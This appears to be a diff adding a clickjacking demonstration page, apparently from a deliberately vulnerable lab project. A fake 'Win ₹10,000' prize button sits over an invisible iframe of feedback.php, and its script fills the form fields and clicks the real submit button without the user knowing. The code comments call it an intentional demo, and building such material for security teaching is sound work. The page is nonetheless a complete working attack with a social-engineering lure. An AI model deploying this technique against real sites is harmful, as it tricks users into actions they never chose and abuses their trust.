@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        iframe {
+            /* Intentional Clickjacking Demo: Make iframe invisible */
+            opacity: 0;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+        }
+        .fake-button {
+            /* Intentional Clickjacking Demo: Position fake button over real submit button */
+            position: absolute;
+            top: 450px; /* Approximate position of submit button in feedback.php */
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.5);
+            z-index: 10;
+        }
+        .fake-button:hover {
+            transform: translateX(-50%) translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Win ₹10,000 Instantly!</h1>
+        <p>Click the button below to claim your prize. It's that easy!</p>
+        <button class="fake-button">🎁 Click Here to Win ₹10,000</button>
+        
+        <!-- Intentional Clickjacking Demo: Invisible iframe loading sensitive page -->
+        <iframe src="feedback.php" id="targetFrame"></iframe>
+    </div>
+    
+    <script>
+        // Intentional Clickjacking Demo: Fake button overlays real button in iframe
+        // When clicked, it triggers the real submit button in the iframe
+        document.querySelector('.fake-button').addEventListener('click', function() {
+            const iframe = document.getElementById('targetFrame');
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            const realButton = iframeDoc.querySelector('button[type="submit"]');
+            if (realButton) {
+                // Auto-fill required fields so HTML5 validation doesn't block the submit
+                if(iframeDoc.getElementById('name')) iframeDoc.getElementById('name').value = 'Clickjacking Victim';
+                if(iframeDoc.getElementById('email')) iframeDoc.getElementById('email').value = 'hacked@example.com';
+                if(iframeDoc.getElementById('message')) iframeDoc.getElementById('message').value = 'This feedback was submitted silently via Clickjacking/Cross-Frame Scripting!';
+                
+                realButton.click();
+                alert('Prize claimed! Check your feedback submissions.');
+            }
+        });
+    </script>
+</body>
+</html>
